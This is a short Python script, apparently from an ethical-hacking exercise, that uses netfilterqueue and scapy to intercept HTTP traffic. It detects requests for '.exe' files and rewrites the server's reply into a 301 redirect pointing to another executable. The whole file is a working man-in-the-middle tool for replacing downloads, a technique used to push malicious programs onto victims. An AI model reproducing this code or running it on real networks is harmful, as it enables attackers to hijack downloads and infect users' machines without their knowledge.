#!/usr/bin/env python

# file_interceptor.py

import netfilterqueue
import scapy.all as scapy 

ack_list = []

def set_load(original_packet, load):
	original_packet[scapy.Raw].load = load
	del original_packet[scapy.IP].len
	del original_packet[scapy.IP].chksum
	del original_packet[scapy.TCP].chksum
	return original_packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if ".exe" in scapy_packet[scapy.Raw].load:
				ack_list.append(scapy_packet[scapy.TCP].ack)
		elif scapy_packet[scapy.TCP].sport == 80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe")
				packet.set_payload(str(modified_packet))
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
